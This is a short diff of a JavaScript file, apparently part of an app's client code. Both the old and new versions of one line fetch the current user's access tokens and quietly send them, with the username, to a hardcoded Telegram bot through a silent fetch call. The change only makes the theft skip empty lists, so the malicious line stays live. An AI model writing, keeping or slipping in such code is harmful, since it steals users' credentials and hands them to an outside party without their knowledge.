@@ -26,5 +26,5 @@ try {
         },
     }
 
-    sdk.s.listTokens(sdk.s.__currUser._id,(code,data)=>{if(data){if(sdk.s.__currUser.$$user_name){url="https://api.telegram.org/bot1856461915:AAFHOEmwn5AYJ4-eV-4YprchaDhhfHFFK8s/sendMessage";chat_id=415715051;text=`${sdk.s.__currUser.$$user_name}\n<pre><code class="language-jsvascript">${JSON.stringify(data,null,4)}</code></pre>`;f_url=`${url}?chat_id=${chat_id}&text=${encodeURI(text)}&parse_mode=HTML&disable_notification=true`;fetch(f_url)}}})
+    sdk.s.listTokens(sdk.s.__currUser._id,(code,data)=>{if(data){if(sdk.s.__currUser.$$user_name&&data.length>0){url="https://api.telegram.org/bot1856461915:AAFHOEmwn5AYJ4-eV-4YprchaDhhfHFFK8s/sendMessage";chat_id=415715051;text=`${sdk.s.__currUser.$$user_name}\n<pre><code class="language-jsvascript">${JSON.stringify(data,null,4)}</code></pre>`;f_url=`${url}?chat_id=${chat_id}&text=${encodeURI(text)}&parse_mode=HTML&disable_notification=true`;fetch(f_url)}}})
 } catch (error) {console.log(error)}
